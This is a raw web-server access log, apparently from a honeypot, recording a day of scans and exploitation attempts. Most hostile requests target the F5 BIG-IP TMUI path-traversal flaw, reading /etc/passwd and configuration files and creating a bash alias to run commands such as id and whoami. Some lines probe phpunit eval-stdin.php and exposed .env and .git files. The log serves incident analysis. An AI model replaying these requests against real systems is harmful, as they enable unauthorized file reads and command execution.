Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 7, 2020 @ 20:28:54.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
"Jul 7, 2020 @ 20:28:47.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",200
"Jul 7, 2020 @ 20:25:40.000",185.39.11.105,GET,/,-,400
"Jul 7, 2020 @ 20:19:09.000",209.17.97.58,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 20:16:08.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:16:02.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:15:50.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:13:19.000",192.35.168.247,GET,/,-,200
"Jul 7, 2020 @ 20:13:19.000",192.35.168.247,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 20:11:27.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:11:06.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:10:28.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:08:33.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:07:43.000",139.162.116.230,GET,/,-,400
"Jul 7, 2020 @ 20:07:23.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:07:06.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:06:34.000",192.241.228.12,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 20:06:20.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:06:11.000",192.241.221.188,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 20:04:12.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:04:07.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:03:55.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:03:53.000",35.188.179.242,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.65.3,200
"Jul 7, 2020 @ 20:03:51.000",192.241.218.125,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 20:03:39.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:03:31.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:03:16.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:03:10.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 20:02:54.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 19:56:48.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 19:56:43.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 19:56:32.000",35.188.179.242,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 19:55:59.000",192.241.218.215,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:55:40.000",185.173.35.25,GET,/,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,200
"Jul 7, 2020 @ 19:55:32.000",35.198.211.137,GET,/,-,400
"Jul 7, 2020 @ 19:55:30.000",35.198.211.137,GET,/,Go-http-client/1.1,200
"Jul 7, 2020 @ 19:55:15.000",162.243.131.153,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:51:40.000",192.241.228.8,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:51:01.000",128.14.134.134,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 19:46:33.000",192.241.228.40,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:46:27.000",162.243.133.14,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:45:52.000",35.198.211.137,GET,/,-,400
"Jul 7, 2020 @ 19:45:52.000",35.198.211.137,GET,/,-,400
"Jul 7, 2020 @ 19:45:52.000",35.198.211.137,GET,/,-,400
"Jul 7, 2020 @ 19:45:51.000",35.198.211.137,POST,/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)",302
"Jul 7, 2020 @ 19:45:51.000",35.198.211.137,POST,/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)",302
"Jul 7, 2020 @ 19:45:51.000",35.198.211.137,POST,/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)",302
"Jul 7, 2020 @ 19:45:50.000",35.198.211.137,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 19:45:50.000",35.198.211.137,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 19:45:50.000",35.198.211.137,POST,/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)",302
"Jul 7, 2020 @ 19:45:49.000",35.198.211.137,GET,/tmui/tmui/login/welcome.jsp,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 19:45:49.000",35.198.211.137,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 19:45:49.000",35.198.211.137,GET,/mgmt/tm/sys/management-ip,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),401
"Jul 7, 2020 @ 19:45:47.000",35.198.211.137,GET,/tmui/login.jsp,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 19:45:18.000",192.241.218.125,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:44:48.000",162.243.133.14,GET,/login,Mozilla/5.0 zgrab/0.x,404
"Jul 7, 2020 @ 19:44:21.000",35.198.211.137,GET,/,-,400
"Jul 7, 2020 @ 19:44:20.000",35.198.211.137,GET,/,Go-http-client/1.1,200
"Jul 7, 2020 @ 19:43:32.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:43:29.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:43:26.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:43:24.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:43:16.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:43:14.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:42:47.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:42:44.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:42:36.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:42:34.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:41:30.000",116.22.199.127,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:41:28.000",116.22.199.127,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 7, 2020 @ 19:39:17.000",185.220.101.10,POST,/hsqldb%3b,-,200
"Jul 7, 2020 @ 19:39:15.000",185.220.101.10,POST,/hsqldb%3b,-,200
"Jul 7, 2020 @ 19:39:10.000",185.220.101.10,POST,/hsqldb%3b,-,200
"Jul 7, 2020 @ 19:36:03.000",128.14.133.58,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 19:34:17.000",209.141.35.68,GET,/,-,400
"Jul 7, 2020 @ 19:15:12.000",209.141.35.68,GET,/,-,400
"Jul 7, 2020 @ 19:08:22.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 19:07:24.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 19:00:02.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.23.0,200
"Jul 7, 2020 @ 19:00:01.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.23.0,200
"Jul 7, 2020 @ 18:59:59.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,500
"Jul 7, 2020 @ 18:58:06.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.23.0,200
"Jul 7, 2020 @ 18:58:05.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.23.0,500
"Jul 7, 2020 @ 18:58:02.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.23.0,200
"Jul 7, 2020 @ 18:58:00.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,500
"Jul 7, 2020 @ 18:53:52.000",37.120.203.196,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+cli,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",500
"Jul 7, 2020 @ 18:53:49.000",37.120.203.196,GET,/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=CUSTOMMESSAGEXD,python-requests/2.22.0,200
"Jul 7, 2020 @ 18:46:20.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.23.0,200
"Jul 7, 2020 @ 18:46:15.000",192.241.228.10,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:48.000",192.241.228.22,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:39.000",192.241.228.22,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:25.000",192.241.219.46,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:21.000",192.241.222.97,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:19.000",192.241.227.160,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:15.000",192.241.219.187,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:14.000",192.241.219.187,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:45:13.000",192.241.227.180,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 18:40:54.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 18:31:28.000",209.17.96.82,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 18:28:29.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 18:28:28.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,500
"Jul 7, 2020 @ 18:28:25.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 18:28:23.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,500
"Jul 7, 2020 @ 18:27:34.000",164.52.24.174,GET,/,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 18:25:37.000",221.5.30.119,GET,/,-,400
"Jul 7, 2020 @ 18:16:17.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 18:16:16.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 18:16:14.000",201.37.160.88,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,500
"Jul 7, 2020 @ 18:12:20.000",71.6.232.7,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",200
"Jul 7, 2020 @ 18:07:10.000",104.238.140.239,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,python-requests/2.18.4,500
"Jul 7, 2020 @ 18:05:47.000",164.52.24.162,GET,/,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 18:00:37.000",95.211.230.211,GET,/.env,Go-http-client/1.1,404
"Jul 7, 2020 @ 18:00:37.000",95.211.230.211,GET,/v2/_catalog,Go-http-client/1.1,404
"Jul 7, 2020 @ 18:00:37.000",95.211.230.211,GET,/api/v1/pods,Go-http-client/1.1,401
"Jul 7, 2020 @ 18:00:37.000",95.211.230.211,GET,/.git/config,Go-http-client/1.1,404
"Jul 7, 2020 @ 18:00:36.000",95.211.230.211,GET,/,Go-http-client/1.1,200
"Jul 7, 2020 @ 17:59:56.000",139.162.116.230,GET,/,-,400
"Jul 7, 2020 @ 17:57:57.000",113.245.62.166,GET,/,-,400
"Jul 7, 2020 @ 17:45:21.000",185.220.101.210,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 17:45:17.000",104.218.63.119,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,500
"Jul 7, 2020 @ 17:45:13.000",185.220.100.240,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 17:45:09.000",77.247.181.165,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,500
"Jul 7, 2020 @ 17:40:15.000",109.70.100.23,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 17:36:54.000",174.194.22.146,GET,/tmui/login.jsp,curl/7.54.0,200
"Jul 7, 2020 @ 17:35:47.000",150.109.237.188,GET,/,-,200
"Jul 7, 2020 @ 17:30:32.000",195.54.160.135,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:30:31.000",195.54.160.135,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:27:09.000",195.54.160.135,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:27:09.000",195.54.160.135,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:22:15.000",128.14.134.134,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 17:18:29.000",193.32.127.226,GET,/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp%20,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),404
"Jul 7, 2020 @ 17:18:28.000",193.32.127.226,GET,/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp%20,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),404
"Jul 7, 2020 @ 17:18:24.000",193.32.127.226,GET,/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=xzz,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 17:18:24.000",193.32.127.226,GET,/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=xzz,Nuclei - Open-source project (github.com/projectdiscovery/nuclei),200
"Jul 7, 2020 @ 17:15:52.000",195.54.160.135,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:15:52.000",195.54.160.135,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",404
"Jul 7, 2020 @ 17:15:34.000",160.176.223.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list,python-requests/2.10.0,500
"Jul 7, 2020 @ 17:12:43.000",160.176.223.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami,python-requests/2.10.0,200
"Jul 7, 2020 @ 16:55:51.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:55:49.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:55:45.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:55:44.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:55:41.000",184.105.220.24,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 16:55:38.000",109.70.100.34,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,500
"Jul 7, 2020 @ 16:55:35.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:55:33.000",193.218.118.130,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 16:55:29.000",193.218.118.130,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,500
"Jul 7, 2020 @ 16:55:20.000",99.234.164.152,GET,/,curl/7.68.0,200
"Jul 7, 2020 @ 16:48:13.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/9e07ae2e-c071-11ea-8d32-2fdee219a855,python-requests/2.18.4,200
"Jul 7, 2020 @ 16:48:11.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/9e07ae2e-c071-11ea-8d32-2fdee219a855&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 16:48:00.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 16:41:57.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:41:57.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:41:49.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:41:49.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:41:20.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:41:20.000",99.234.164.152,GET,/,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 16:40:39.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,500
"Jul 7, 2020 @ 16:38:46.000",109.70.100.21,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 16:38:01.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 16:35:28.000",93.185.225.89,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,500
"Jul 7, 2020 @ 16:31:22.000",185.220.101.198,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 16:31:18.000",185.220.101.198,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 16:31:14.000",54.38.81.231,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,500
"Jul 7, 2020 @ 16:29:23.000",195.54.160.135,POST,/api/jsonws/invoke,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",401
"Jul 7, 2020 @ 16:27:42.000",195.54.160.135,POST,/api/jsonws/invoke,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",401
"Jul 7, 2020 @ 16:26:20.000",113.173.6.131,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55,500
"Jul 7, 2020 @ 16:26:20.000",113.173.6.131,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55,200
"Jul 7, 2020 @ 16:26:11.000",128.14.133.58,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",200
"Jul 7, 2020 @ 16:24:59.000",34.220.203.219,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/VERSION,"Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19",200
